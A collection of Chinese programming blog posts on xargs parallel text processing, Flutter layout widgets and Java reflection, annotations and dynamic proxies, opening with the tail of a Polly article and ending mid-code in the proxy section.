这个示例演示了从注册池中选择一个或多个策略应用在不同的HttpClient上，同一个策略被重复使用了两次。策略注册池的更复杂用例包括从外部动态更新注册池中的策略，以便在运行期间动态重新配置策略（请查阅 http://t.cn/Ehidgqy 了解更多）。
相关阅读：
.NET 开源项目 Polly 介绍
在 .NET Core 中结合 HttpClientFactory 使用 Polly（上篇）
在 .NET Core 中结合 HttpClientFactory 使用 Polly（下篇）

********************************************************************************************************************************************************************************************************
shell高效处理文本(1)：xargs并行处理
xargs具有并行处理的能力，在处理大文件时，如果应用得当，将大幅提升效率。
xargs详细内容(全网最详细)：https://www.cnblogs.com/f-ck-need-u/p/5925923.html
效率提升测试结果
先展示一下使用xargs并行处理提升的效率，稍后会解释下面的结果。
测试环境：

win10子系统上

32G内存

8核心cpu

测试对象是一个放在固态硬盘上的10G文本文件(如果你需要此测试文件，点此下载，提取码: semu)

下面是正常情况下wc -l统计这个10G文件行数的结果，花费16秒，多次测试，cpu利用率基本低于80%。
$ /usr/bin/time wc -l 9.txt
999999953 9.txt
4.56user 3.14system 0:16.06elapsed 47%CPU (0avgtext+0avgdata 740maxresident)k
0inputs+0outputs (0major+216minor)pagefaults 0swaps
通过分割文件，使用xargs的并行处理功能进行统计，花费时间1.6秒，cpu利用率752%：
$ /usr/bin/time ./b.sh
999999953
7.67user 4.54system 0:01.62elapsed 752%CPU (0avgtext+0avgdata 1680maxresident)k
0inputs+0outputs (0major+23200minor)pagefaults 0swaps
用grep从这个10G的文本文件中筛选数据，花费时间24秒，cpu利用率36%：
$ /usr/bin/time grep "10000" 9.txt >/dev/null
6.17user 2.57system 0:24.19elapsed 36%CPU (0avgtext+0avgdata 1080maxresident)k
0inputs+0outputs (0major+308minor)pagefaults 0swaps
通过分割文件，使用xargs的并行处理功能进行统计，花费时间1.38秒，cpu利用率746%：
$ /usr/bin/time ./a.sh
6.01user 4.34system 0:01.38elapsed 746%CPU (0avgtext+0avgdata 1360maxresident)k
0inputs+0outputs (0major+31941minor)pagefaults 0swaps
速度提高的不是一点点。
xargs并行处理简单示例
要使用xargs的并行功能，只需使用"-P N"选项即可，其中N是指定要运行多少个并行进程，如果指定为0，则使用尽可能多的并行进程数量。
需要注意的是：

既然要并行，那么xargs必须得分批传送管道的数据，xargs的分批选项有"-n"、"-i"、"-L"，如果不知道这些内容，看本文开头给出的文章。

并行进程数量应该设置为cpu的核心数量。如果设置为0，在处理时间较长的情况下，很可能会并发几百个甚至上千个进程。在我测试一个花费2分钟的操作时，创建了500多个进程。

在本文后面，还给出了其它几个注意事项。

例如，一个简单的sleep命令，在不使用"-P"的时候，默认是一个进程按批的先后进行处理：
[root@xuexi ~]# time echo {1..4} | xargs -n 1 sleep
 
real    0m10.011s
user    0m0.000s
sys     0m0.011s
总共用了10秒，因为每批传一个参数，第一批睡眠1秒，然后第二批睡眠2秒，依次类推，还有3秒、4秒，共1+2+3+4=10秒。
如果使用-P指定4个处理进程，它将以处理时间最长的为准：
[root@xuexi ~]# time echo {1..4} | xargs -n 1 -P 4 sleep
 
real    0m4.005s
user    0m0.000s
sys     0m0.007s
再例如，find找到一大堆文件，然后用grep去筛选：
find /path -name "*.log" | xargs -i grep "pattern" {}
find /path -name "*.log" | xargs -P 4 -i grep "pattern" {}
上面第一个语句，只有一个grep进程，一次处理一个文件，每次只被其中一个cpu进行调度。也就是说，它无论如何，都只用到了一核cpu的运算能力，在极端情况下，cpu的利用率是100%。
上面第二个语句，开启了4个并行进程，一次可以处理从管道传来的4个文件，在同一时刻这4个进程最多可以被4核不同的CPU进行调度，在极端情况下，cpu的利用率是400%。
并行处理示例
下面是文章开头给出的实验结果对应的示例。一个10G的文本文件9.txt，这个文件里共有9.9亿(具体的是999999953)行数据。
首先一个问题是，怎么统计这么近10亿行数据的？wc -l，看看时间花费。
$ /usr/bin/time wc -l 9.txt
999999953 9.txt
4.56user 3.14system 0:16.06elapsed 47%CPU (0avgtext+0avgdata 740maxresident)k
0inputs+0outputs (0major+216minor)pagefaults 0swaps
总共花费了16.06秒，cpu利用率是47%。
随后，我把这10G数据用split切割成了100个小文件，在提升效率方面，split切割也算是妙用无穷：
split -n l/100 -d -a 3 9.txt fs_
这100个文件，每个105M，文件名都以"fs_"为前缀：
$ ls -lh fs* | head -n 5
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_000
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_001
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_002
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_003
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_004
然后，用xargs的并行处理来统计，以下是统计脚本b.sh的内容：
#!/usr/bin/env bash

find /mnt/d/test -name "fs*" |\
 xargs -P 0 -i wc -l {} |\
 awk '{sum += $1}END{print sum}'
上面用-P 0选项指定了尽可能多地开启并发进程数量，如果要保证最高效率，应当设置并发进程数量等于cpu的核心数量(在我的机器上，应该设置为8)，因为在操作时间较久的情况下，可能会并行好几百个进程，这些进程之间进行切换也会消耗不少资源。
然后，用这个脚本去统计测试：
$ /usr/bin/time ./b.sh
999999953
7.67user 4.54system 0:01.62elapsed 752%CPU (0avgtext+0avgdata 1680maxresident)k
0inputs+0outputs (0major+23200minor)pagefaults 0swaps
只花了1.62秒，cpu利用率752%。和前面单进程处理相比，时间是原来的16分之1，cpu利用率是原来的好多好多倍。
再来用grep从这个10G的文本文件中筛选数据，例如筛选包含"10000"字符串的行：
$ /usr/bin/time grep "10000" 9.txt >/dev/null
6.17user 2.57system 0:24.19elapsed 36%CPU (0avgtext+0avgdata 1080maxresident)k
0inputs+0outputs (0major+308minor)pagefaults 0swaps
24秒，cpu利用率36%。
再次用xargs来处理，以下是脚本：
#!/usr/bin/env bash

find /mnt/d/test -name "fs*" |\
 xargs -P 8 -i grep "10000" {} >/dev/null
测试结果：
$ /usr/bin/time ./a.sh
6.01user 4.34system 0:01.38elapsed 746%CPU (0avgtext+0avgdata 1360maxresident)k
0inputs+0outputs (0major+31941minor)pagefaults 0swaps
花费时间1.38秒，cpu利用率746%。
这比用什么ag、ack替代grep有效多了。
提升哪些效率以及注意事项
xargs并行处理用的好，能大幅提升效率，但这是有条件的。
首先要知道，xargs是如何提升效率的，以grep命令为例：
ls fs* | xargs -i -P 8 grep 'pattern' {}
之所以xargs能提高效率，是因为xargs可以分批传递管道左边的结果给不同的并发进程，也就是说，xargs要高效，得有多个文件可处理。对于上面的命令来说，ls可能输出了100个文件名，然后1次传递8个文件给8个不同的grep进程。
还有一些注意事项：
1.如果只有单核心cpu，像提高效率，没门
2.xargs的高效来自于处理多个文件，如果你只有一个大文件，那么需要将它切割成多个小片段
3.由于是多进程并行处理不同的文件，所以命令的多行输出结果中，顺序可能会比较随机
例如，统计行数时，每个文件的出现顺序是不受控制的。
10000000 /mnt/d/test/fs_002
9999999 /mnt/d/test/fs_001
10000000 /mnt/d/test/fs_000
10000000 /mnt/d/test/fs_004
9999999 /mnt/d/test/fs_005
9999999 /mnt/d/test/fs_003
10000000 /mnt/d/test/fs_006
9999999 /mnt/d/test/fs_007
不过大多数时候这都不是问题，将结果排序一下就行了。
4.xargs提升效率的本质是cpu的利用率，因此会有内存、磁盘速度的瓶颈。如果内存小，或者磁盘速度慢(将因为加载数据到内存而长时间处于io等待的睡眠状态)，xargs的并行处理基本无效。
例如，将上面10G的文本文件放在虚拟机上，机械硬盘，内存2G，将会发现使用xargs并行和普通的命令处理几乎没有差别，因为绝大多数时间都花在了加载文件到内存的io等待上。
下一篇文章将介绍GNU parallel并行处理工具，它的功能更丰富，效果更强大。

********************************************************************************************************************************************************************************************************
Flutter 布局控件完结篇

本文对Flutter的29种布局控件进行了总结分类，讲解一些布局上的优化策略，以及面对具体的布局时，如何去选择控件。

1. 系列文章

Flutter 布局详解
Flutter 布局（一）- Container详解
Flutter 布局（二）- Padding、Align、Center详解
Flutter 布局（三）- FittedBox、AspectRatio、ConstrainedBox详解
Flutter 布局（四）- Baseline、FractionallySizedBox、IntrinsicHeight、IntrinsicWidth详解
Flutter 布局（五）- LimitedBox、Offstage、OverflowBox、SizedBox详解
Flutter 布局（六）- SizedOverflowBox、Transform、CustomSingleChildLayout详解
Flutter 布局（七）- Row、Column详解
Flutter 布局（八）- Stack、IndexedStack、GridView详解
Flutter 布局（九）- Flow、Table、Wrap详解
Flutter 布局（十）- ListBody、ListView、CustomMultiChildLayout详解

1.1 乱侃
前前后后也算是拖拖拉拉的写了一些Flutter的文章，写的也都比较粗略。最近工作调动，内部换了部门，一顿瞎忙活，也打乱了原本的分享计划。
从我最开始接触Flutter到现在，差不多四个多月了。在这段时间里面，Flutter也发布了Release Preview版本。各个技术网站本着先拨头筹的心态，推广了几波，国内的人气跟着也起来了不少。全世界Flutter开发人员中，国内从业者占据了很大的比重，这个现象本身并不能说明什么，不过可以反映一点，有商业诉求吧。当然观望的还是占绝大部分，除了一些个人开发者爱折腾外，也就是一些大的业务成熟到不能再成熟的团队，内部消化人员去折腾这个了。
插个题外话，有感于最近的工作变动，这段时间胡思乱想的比较多。一门技术对程序员来说到底意味着什么？如果不需要再为生计奔波，是否还会对目前已上手的技术感兴趣？如果你现在的项目所需要的技术，对你个人而言毫无加成，只会浪费你的时间，让你在已有的技术栈上渐行渐远，你是否还会参与这个项目。只有极少数人会遇上逆天改命的项目，不管参与什么项目，技术人员的立身之本始终是技术（高管或者打算换行的除外），技术的选型，除去时间效率后续维护等普适性的考虑要素外，排在第一位的始终应该是对自身的提高，扯的有些远了哈。
1.2 本质
我数了一下我文章总结过的布局控件，总共有29种。乍看会觉得真鸡毛的多，不乍看，也会觉得鸡毛的真多。为什么其他的移动平台没有这么多布局控件呢？其实不然，其他平台没有这么细分。
以Android平台为例，最基础的几种布局例如LinearLayout、RelativeLayout、ConstraintLayout等等。很多Flutter的控件，对于Android来说，仅仅是一个属性的设置问题。
再往上看，iOS、Android、Web这些平台的布局，其实最基本就那几种，线性布局、绝对布局、相对布局等等。Flutter也逃不出这些，那为什么Flutter现在有这么多布局控件呢？

第一点，之前文章介绍过的，Flutter的理念是万物皆为widget。这和Flutter的实现机制有关，而不是因为它在布局上有什么特殊性，这也是最主要的一点。
第二点，我觉得是因为这是Flutter的初期，如果有经历过一个技术的完整发展周期，就会明白，前期只是提供各种零件，只有商业支撑或者人员支撑足够的时候，才会去优化零件。而现在就是这么一种资源不足的状态。各种组件可以合并的有很多，底层的实现机制不会变，只是再加一层即可，这也是可以造轮子的地方，例如封装一套适用于Android、iOS或者Web人员的控件库等。
第三点，跟初期相关，一套新的技术，各种东西不可能一下子全想明白，路总是走着走着才发现走歪了，就像一些控件，可能一些地方合适，但是一些新的地方又不太合适，所以就再造一个，所以有些控件看起来功能十分相似。

说了这么多，我其实就想说明一点，Flutter现在还只是处在社会发展的初级阶段，还处在温饱问题都解决不了的状态，想达到小康还需要很长的一段路要走。
2. 单节点控件
单节点控件，顾名思义就是只有一个节点的布局控件。这种控件有多少个呢，我之前文章总结过的有18种，现阶段还是不排除增加的可能，哈哈。
2.1 分类
在这小节里，我尝试从多个维度去对这些控件进行分类，希望这样可以帮助大家理解。
2.1.1 按照继承划分

上面是这18种控件的父节点层面的继承关系，唯一不同的一个控件就是Container。所以按照是否继承自SingleChildRenderObjectWidget的分类如下：

继承自StatelessWidget的控件，有Container。
继承自SingleChildRenderObjectWidget的控件，有Padding、Align、Center、FittedBox、AspectRatio、ConstrainedBox、Baseline、FractionallySizedBox、IntrinsicHeight、IntrinsicWidth、LimitedBox、Offstage、OverflowBox、SizedBox、SizedOverflowBox、Transform、CustomSingleChildLayout。

Container是一个组合控件，不是一个基础控件，这点从继承关系就可以看出来。
2.1.2 按照功能是否单一划分
分类如下：

功能不单一的控件，Container、Transform、FittedBox、SizedOverflowBox。
功能单一的控件，有Padding、Align、Center、AspectRatio、ConstrainedBox、Baseline、FractionallySizedBox、IntrinsicHeight、IntrinsicWidth、LimitedBox、Offstage、OverflowBox、SizedBox、CustomSingleChildLayout。

先在此处小结一下，可以看出Container的特殊之处了吧，为什么Container这么特殊了。这个特殊要从两个层面去看。

对于Flutter而言，Container是特殊的，因为它不是功能单一的控件，是一个组合的控件，所以它相对于Flutter是特殊的。
对于移动端开发者而言，它不是特殊的，因为很多UI都是一些基础功能组合的，这样能让开发者更方便的使用。

那能得出什么结论呢？我个人觉得，Container这种组合的控件会越来越多，也会有个人开发者去开发这种通用型的组合控件，这是一个大趋势，是Flutter走向易用的一小步。
2.1.3 按照功能划分
在此处我按照定位、尺寸、绘制三部分来尝试着去做功能的划分，当然这个划分并不绝对，仁者见仁吧。

定位控件：Container、Align、Center、FittedBox、Baseline、Transform。
尺寸控件：Container、FittedBox、AspectRatio、ConstrainedBox、FractionallySizedBox、IntrinsicHeight、IntrinsicWidth、LimitedBox、SizedBox、SizedOverflowBox。
绘制控件：Container、Padding、Offstage、OverflowBox、SizedOverflowBox、Transform。

有一个控件并没有归到这三类中，CustomSingleChildLayout可以自定义实现，此处不做分类。Baseline可以把它放到绘制里面去，此处我按照调节文字的位置去做分类，这个大家知道就行，并不是说只能这么划分。
对于绘制控件，其实分的有些杂，我把显示相关的都归到这里，例如是否显示、内边距、是否超出显示以及变形等等。
每一种大类，Flutter都提供了多种控件。经过这么划分，可以看出很多控件功能的交叉，很多时候一个属性的事情，Flutter还是分出了一个控件。

2.2 使用
单节点控件虽然这么多，但是大部分不会挨个去尝试。对于大部分人而言，都是佛系的用法，一个控件能够使用，就一直用到死。
在布局上，大方向还是不停的拆，把一张设计图，拆成一棵树，每个节点根据需要，选择合适的控件，然后从根部开始不停嵌套，布局就完成了。
2.3 控件的选择
控件种类繁多，真正使用的时候该如何去选择呢？有万金油的做法，不管啥都用Container，这也是很多初接触的人经常干的方式。这么做的确可以按照设计图把布局给实现了，但是会涉及到一些性能上的问题。
控件的选择，按照控件最小功能的标准去选择。例如需要将子节点居中，可以使用Container设置alignment的方式，也可以使用Center。但是从功能上，Center是最小级别的，因此选择它的话，额外的开销会最小。
将UI实现了，这只是最基本的，当达到这一步了，应该更多的去思考，如何更好的布局，使得性能更高。
3. 多节点控件
多节点控件的种类就少了一些，虽然也有11种，但是功能和场景多了，所以选择上反而会简单一些。
3.1 分类
多节点控件内部实现比单节点控件复杂的多，会从继承以及功能两个方向去做分类。
3.1.1 按照继承划分

从上图可以看出，多节点布局控件基本上可以分为三条线

继承自BoxScrollView的控件，有GridView以及ListView；
继承自MultiChildRenderObjectWidget的控件，有Row、Column、Flow、Wrap、Stack、IndexedStack、ListBody、CustomMultiChildLayout八种；
继承自RenderObjectWidget的控件，有Table一种。

之前介绍过，GridView和ListView的实现都是非常相似的，基本上就是silvers只包含一个Sliver（GridView为SilverGrid、ListVIew为SliverList）的CustomScrollView。 这也是为啥这两元素都继承自BoxScrollView的缘故。
MultiChildRenderObjectWidget类，官方解读如下

A superclass for RenderObjectWidgets that configure RenderObject subclasses
that have a single list of children.

它只是一个含有单一list子节点的控件，为什么Table不需要继承自MultiChildRenderObjectWidget呢？
这是因为Table的子节点是二维（横竖）的，而MultiChildRenderObjectWidget提供的是一个一维的子节点管理，所以必须继承自RenderObjectWidget。知道了这些过后，对继承关系的理解会有更好的帮助。
3.1.2 按照功能划分
这个对于多节点布局控件来说，还是比较难以划分的，笔者试着做了如下划分：

列表：GridView、ListView；
单列单行或者多列多行：Row、Column、Flow、Wrap、ListBody、Table；
显示位置相关：Stack、IndexedStack、CustomMultiChildLayout。

个人觉得这种分类方式不是特别的稳妥，但还是写下来了，请大家仁者见仁。
GridView和ListView分为一类，一个是因为其实现非常的相似，另一个原因是这两个控件内容区域可以无限，不像其他控件的内容区域都是固定的，因此将这两个划分为一类。
关于单列单行多列多行的，也并不是说很严格的，Row、Column、Table、ListBody可能会遵守这种划分，Flow以及Wrap则是近似的多列多行。这种划分绝对不是绝对的，只是个人的一种考量划分方式。
3.2 使用
多节点控件种类较少，而且功能重叠的很少，因此在使用上来说，还是简单一些。比较常用的GridView、ListView、Row、Column、Stack，这几个控件基本上涵盖了大部分的布局了。
3.3 控件的选择
多节点控件功能重叠的较少，因此选择上，不会存在太多模凌两可的问题，需要什么使用什么即可。
4. 性能优化
性能优化这块儿，可能仁者见仁，并没有一个统一的说法，毕竟现在Flutter各方面都还不完善。但是，大方向还是有的，尽量使用功能集更小的控件，这个对于渲染效率上还是有所帮助的。
4.1 优化
在这里我试着去列举一些，并不一定都正确。

对于单节点控件，如果一个布局多个控件都可以完成，则使用功能最小的，可以参照上面控件分类中的功能划分来做取舍；
对于多节点控件，如果单节点控件满足需求的话，则去使用单节点控件进行布局；
对于ListView，标准构造函数适用于条目比较少的情况，如果条目较多的话，尽量使用ListView.builder；
对于GridView，如果需要展示大量的数据的话，尽量使用GridView.builder；
Flow、Wrap、Row、Column四个控件，单纯论效率的话，Flow是最高效的，但是使用起来是最复杂的；
如果是单行或者单列的话，Row、Column比Table更高效；
Stack和CustomMultiChildLayout如果同时满足需求的话，CustomMultiChildLayout在某些时候效率会更高一些，但是取决于Delegate的实现，且使用起来更加的复杂；

上面所列的比较杂，但是归纳起来，无非这几点：

功能越少的控件，效率越高；
ListView以及GridView的builder构造函数效率更高；
实现起来比较复杂的控件，效率一般会更高。

4.2 选择
控件的选择，个人觉得把握大方向就够了。如果时间紧急，以实现效率最优先，如果时间充裕的话，可以按照一些优化细则，去做一些选择。单纯控件层面，带来性能上的改进毕竟十分有限。
5. 实战
首先看一下实际的效果图，这个是之前做工程中，比较复杂的一个界面吧，就算放到native上看，也是比较复杂的。

这个页面中有不少自定义控件，例如日期选择、进度等。整体看着复杂，实现起来其实也还好。关于如何布局拆解，之前文章有过介绍，在这里不再阐述，诀窍就是一个字----拆。
5.1 关于自定义控件
自定义控件一般都是继承自StatelessWidget、StatefulWidget。也有一些特殊的，例如上面的进度控件，直接使用Canvas画的。
对于需要更新状态的，一般都是继承自StatefulWidget，对于不需要更新状态的，使用StatelessWidget即可，能够使用StatelessWidget的时候，也尽量使用它，StatefulWidget在页面更新的时候，会存在额外的开销。
Flutter的自定义控件，写起来可能会比原生的更简单，它更多的是一些基础控件的组合使用，而很少涉及到底层的一些重写。
5.2 关于生命周期
这是很蛋疼的一个问题，一个纯Flutter的App，类似于Android中的单Activity应用。某个具体的页面就算去监听native层的生命周期，也仅仅是获取到base activity的，而无法获取到页面层级的。
5.3 感想
Flutter如果轮子足够的话，还是非常吸引人的，在熟悉了这些基础组件过后，编写起来，速度会非常快。自定义控件的实现，也比较简单。但是，性能方面，还是存在比较大的问题，复杂页面首次载入，速度还是比较慢。对于高端机型来说，整体流畅度很不错，堪比原生的app，低端机型，表现就比较捉急吧。整体来说，Flutter表现还是挺不错的，可以上手试试，把玩把玩吧。就是写起来，写着写着就觉得恶心，是真的恶心的那种恶心，看着各种嵌套标签，感觉被降维成了web开发。
近期看到一些基于Flutter的自动布局解决方案，之前也有想过，完全可以基于Flutter做出布局的工具，仅仅是拖拽就可以实现完成度非常高的布局页面。也得益于Flutter本身的思想和实现机制，web方面的很多东西，个人觉得都可以借鉴到Flutter上。单纯从UI层来说，Flutter确实有自己独特的地方。如果Flutter在最开始，就仅仅是一套跨平台的UI的话，可能更容易被人们接受吧。
前几天看了官方的camera插件，还是挺蛋疼的，对于国内的Android端来说，直接拿来商用几乎是不可能的。插件基于camera2去实现，国内大部分厂商对于camera2的支持很差，一些很容易复现的crash也没有去解决。
如果决定在现有项目中使用Flutter，则需要做好埋坑造轮子的觉悟。如果人力紧缺的话，不应该在这上面去投入，人力富余的时候，可以投入人力跟进研究，让业界觉得你们很棒很前沿。
6. 后话
笔者建了一个Flutter学习相关的项目，Github地址，里面包含了笔者写的关于Flutter学习相关的一些文章，会定期更新，也会上传一些学习Demo，欢迎大家关注。
7. 参考

Flutter 布局详解


********************************************************************************************************************************************************************************************************
反射、注解和动态代理
反射是指计算机程序在运行时访问、检测和修改它本身状态或行为的一种能力，是一种元编程语言特性，有很多语言都提供了对反射机制的支持，它使程序能够编写程序。Java的反射机制使得Java能够动态的获取类的信息和调用对象的方法。
一、Java反射机制及基本用法
在Java中，Class（类类型）是反射编程的起点，代表运行时类型信息（RTTI，Run-Time Type Identification）。java.lang.reflect包含了Java支持反射的主要组件，如Constructor、Method和Field等，分别表示类的构造器、方法和域，它们的关系如下图所示。

Constructor和Method与Field的区别在于前者继承自抽象类Executable，是可以在运行时动态调用的，而Field仅仅具备可访问的特性，且默认为不可访问。下面了解下它们的基本用法：


获取Class对象有三种方式，Class.forName适合于已知类的全路径名，典型应用如加载JDBC驱动。对同一个类，不同方式获得的Class对象是相同的。

// 1. 采用Class.forName获取类的Class对象
Class clazz0 = Class.forName("com.yhthu.java.ClassTest");
System.out.println("clazz0:" + clazz0);
// 2. 采用.class方法获取类的Class对象
Class clazz1 = ClassTest.class;
System.out.println("clazz1:" + clazz1);
// 3. 采用getClass方法获取类的Class对象
ClassTest classTest = new ClassTest();
Class clazz2 = classTest.getClass();
System.out.println("clazz2:" + clazz2);
// 4. 判断Class对象是否相同
System.out.println("Class对象是否相同:" + ((clazz0.equals(clazz1)) && (clazz1.equals(clazz2))));

注意：三种方式获取的Class对象相同的前提是使用了相同的类加载器，比如上述代码中默认采用应用程序类加载器（sun.misc.Launcher$AppClassLoader）。不同类加载器加载的同一个类，也会获取不同的Class对象：

// 自定义类加载器
ClassLoader myLoader = new ClassLoader() {
    @Override
    public Class<?> loadClass(String name) throws ClassNotFoundException {
        try {
            String fileName = name.substring(name.lastIndexOf(".") + 1) + ".class";
            InputStream is = getClass().getResourceAsStream(fileName);
            if (is == null) {
                return super.loadClass(name);
            }
            byte[] b = new byte[is.available()];
            is.read(b);
            return defineClass(name, b, 0, b.length);
        } catch (IOException e) {
            throw new ClassNotFoundException(name);
        }
    }
};
// 采用自定义类加载器加载
Class clazz3 = Class.forName("com.yhthu.java.ClassTest", true, myLoader);
// clazz0与clazz3并不相同
System.out.println("Class对象是否相同:" + clazz0.equals(clazz3));

通过Class的getDeclaredXxxx和getXxx方法获取构造器、方法和域对象，两者的区别在于前者返回的是当前Class对象申明的构造器、方法和域，包含修饰符为private的；后者只返回修饰符为public的构造器、方法和域，但包含从基类中继承的。

// 返回申明为public的方法，包含从基类中继承的
for (Method method: String.class.getMethods()) {
    System.out.println(method.getName());
}
// 返回当前类申明的所有方法，包含private的
for (Method method: String.class.getDeclaredMethods()) {
    System.out.println(method.getName());
}

通过Class的newInstance方法和Constructor的newInstance方法方法均可新建类型为Class的对象，通过Method的invoke方法可以在运行时动态调用该方法，通过Field的set方法可以在运行时动态改变域的值，但需要首先设置其为可访问（setAccessible）。

二、 注解
注解（Annontation）是Java5引入的一种代码辅助工具，它的核心作用是对类、方法、变量、参数和包进行标注，通过反射来访问这些标注信息，以此在运行时改变所注解对象的行为。Java中的注解由内置注解和元注解组成。内置注解主要包括：

@Override - 检查该方法是否是重载方法。如果发现其父类，或者是引用的接口中并没有该方法时，会报编译错误。
@Deprecated - 标记过时方法。如果使用该方法，会报编译警告。
@SuppressWarnings - 指示编译器去忽略注解中声明的警告。
@SafeVarargs - Java 7 开始支持，忽略任何使用参数为泛型变量的方法或构造函数调用产生的警告。
@FunctionalInterface - Java 8 开始支持，标识一个匿名函数或函数式接口。

这里，我们重点关注元注解，元注解位于java.lang.annotation包中，主要用于自定义注解。元注解包括：

@Retention - 标识这个注解怎么保存，是只在代码中，还是编入class文件中，或者是在运行时可以通过反射访问，枚举类型分为别SOURCE、CLASS和RUNTIME；
@Documented - 标记这些注解是否包含在用户文档中。
@Target - 标记这个注解应该是哪种Java 成员，枚举类型包括TYPE、FIELD、METHOD、CONSTRUCTOR等；
@Inherited - 标记这个注解可以继承超类注解，即子类Class对象可使用getAnnotations()方法获取父类被@Inherited修饰的注解，这个注解只能用来申明类。
@Repeatable - Java 8 开始支持，标识某注解可以在同一个声明上使用多次。

自定义元注解需重点关注两点：1）注解的数据类型；2）反射获取注解的方法。首先，注解中的方法并不支持所有的数据类型，仅支持八种基本数据类型、String、Class、enum、Annotation和它们的数组。比如以下代码会产生编译时错误：
@Documented
@Inherited
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
public @interface AnnotationTest {
    // 1. 注解数据类型不能是Object；2. 默认值不能为null
    Object value() default null;
    // 支持的定义方式
    String value() default "";
}
其次，上节中提到的反射相关类（Class、Constructor、Method和Field）和Package均实现了AnnotatedElement接口，该接口定义了访问反射信息的方法，主要如下：
// 获取指定注解类型
getAnnotation(Class<T>):T;
// 获取所有注解，包括从父类继承的
getAnnotations():Annotation[];
// 获取指定注解类型，不包括从父类继承的
getDeclaredAnnotation(Class<T>):T
// 获取所有注解，不包括从父类继承的
getDeclaredAnnotations():Annotation[];
// 判断是否存在指定注解
isAnnotationPresent(Class<? extends Annotation>:boolean
当使用上例中的AnnotationTest 标注某个类后，便可在运行时通过该类的反射方法访问注解信息了。
@AnnotationTest("yhthu")
public class AnnotationReflection {

    public static void main(String[] args) {
        AnnotationReflection ar = new AnnotationReflection();
        Class clazz = ar.getClass();
        // 判断是否存在指定注解
        if (clazz.isAnnotationPresent(AnnotationTest.class)) {
            // 获取指定注解类型
            Annotation annotation = clazz.getAnnotation(AnnotationTest.class);
            // 获取该注解的值
            System.out.println(((AnnotationTest) annotation).value());
        }
    }
}

当自定义注解只有一个方法value()时，使用注解可只写值，例如：@AnnotationTest("yhthu")

三、动态代理
代理是一种结构型设计模式，当无法或不想直接访问某个对象，或者访问某个对象比较复杂的时候，可以通过一个代理对象来间接访问，代理对象向客户端提供和真实对象同样的接口功能。经典设计模式中，代理模式有四种角色：

Subject抽象主题类——申明代理对象和真实对象共同的接口方法；
RealSubject真实主题类——实现了Subject接口，真实执行业务逻辑的地方；
ProxySubject代理类——实现了Subject接口，持有对RealSubject的引用，在实现的接口方法中调用RealSubject中相应的方法执行；
Cliect客户端类——使用代理对象的类。


在实现上，代理模式分为静态代理和动态代理，静态代理的代理类二进制文件是在编译时生成的，而动态代理的代理类二进制文件是在运行时生成并加载到虚拟机环境的。JDK提供了对动态代理接口的支持，开源的动态代理库（Cglib、Javassist和Byte Buddy）提供了对接口和类的代理支持，本节将简单比较JDK和Cglib实现动态代理的异同，后续章节会对Java字节码编程做详细分析。
3.1 JDK动态代理接口
JDK实现动态代理是通过Proxy类的newProxyInstance方法实现的，该方法的三个入参分别表示：
public static Object newProxyInstance(ClassLoader loader, Class<?>[] interfaces, InvocationHandler h)

ClassLoader loader，定义代理生成的类的加载器，可以自定义类加载器，也可以复用当前Class的类加载器；
Class<?>[] interfaces，定义代理对象需要实现的接口；
InvocationHandler h，定义代理对象调用方法的处理，其invoke方法中的Object proxy表示生成的代理对象，Method表示代理方法， Object[]表示方法的参数。

通常的使用方法如下：
private Object getProxy() {
    return Proxy.newProxyInstance(JDKProxyTest.class.getClassLoader(), new Class<?>[]{Subject.class},
            new MyInvocationHandler(new RealSubject()));
}

private static class MyInvocationHandler implements InvocationHandler {
    private Object realSubject;

    public MyInvocationHandler(Object realSubject) {
        this.realSubject = realSubject;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.out.println("Some thing before method invoke");
        Object result = method.invoke(realSubject, args);
        System.out.println("Some thing after method invoke");
        return result;
    }
}
类加载器采用当前类的加载器，默认为应用程序类加载器（sun.misc.Launcher$AppClassLoader）；接口数组以Subject.class为例，调用方法处理类MyInvocationHandler实现InvocationHandler接口，并在构造器中传入Subject的真正的业务功能服务类RealSubject，在执行invoke方法时，可以在实际方法调用前后织入自定义的处理逻辑，这也就是AOP（面向切面编程）的原理。
关于JDK动态代理，有两个问题需要清楚：

Proxy.newProxyInstance的代理类是如何生成的？Proxy.newProxyInstance生成代理类的核心分成两步：

// 1. 获取代理类的Class对象
Class<?> cl = getProxyClass0(loader, intfs);
// 2. 利用Class获取Constructor，通过反射生成对象
cons.newInstance(new Object[]{h});
与反射获取Class对象时搜索classpath路径的.class文件不同的是，这里的Class对象完全是“无中生有”的。getProxyClass0根据类加载器和接口集合返回了Class对象，这里采用了缓存的处理。
// 缓存(key, sub-key) -> value，其中key为类加载器，sub-key为代理的接口，value为Class对象
private static final WeakCache<ClassLoader, Class<?>[], Class<?>>
    proxyClassCache = new WeakCache<>(new KeyFactory(), new ProxyClassFactory());
// 如果实现了代理接口的类已存在就返回缓存对象，否则就通过ProxyClassFactory生成
private static Class<?> getProxyClass0(ClassLoader loader, Class<?>... interfaces) {
    if (interfaces.length > 65535) {
        throw new IllegalArgumentException("interface limit exceeded");
    }
    return proxyClassCache.get(loader, interfaces);
}
如果实现了代理接口的类已存在就返回缓存对象，否则就通过ProxyClassFactory生成。ProxyClassFactory又是通过下面的代码生成Class对象的。
// 生成代理类字节码文件
byte[] proxyClassFile = ProxyGenerator.generateProxyClass(proxyName, interfaces, accessFlags);
try {
    // defineClass0为native方法，生成Class对象
    return defineClass0(loader, proxyName, proxyClassFile, 0, proxyClassFile.length);
} catch (ClassFormatError e) {
    throw new IllegalArgumentException(e.toString());
}
generateProxyClass方法是用来生成字节码文件的，根据生成的字节码文件，再在native层生成Class对象。

InvocationHandler的invoke方法是怎样调用的？
回答这个问题得先看下上面生成的Class对象究竟是什么样的，将ProxyGenerator生成的字节码保存成文件，然后反编译打开（IDEA直接打开），可见生成的Proxy.class主要包含equals、toString、hashCode和代理接口的request方法实现。

public final class $Proxy extends Proxy implements Subject {
    // m1 = Object的equals方法
    private static Method m1;
    // m2 = Object的toString方法
    private static Method m2;
    // Subject的request方法
    private static Method m3;
    // Object的hashCode方法
    private static Method m0;
 
    // 省略m1/m2/m0，此处只列出request方法实现
    public final void request() throws  {
        try {
            super.h.invoke(this, m3, (Object[])null);
        } catch (RuntimeException | Error var2) {
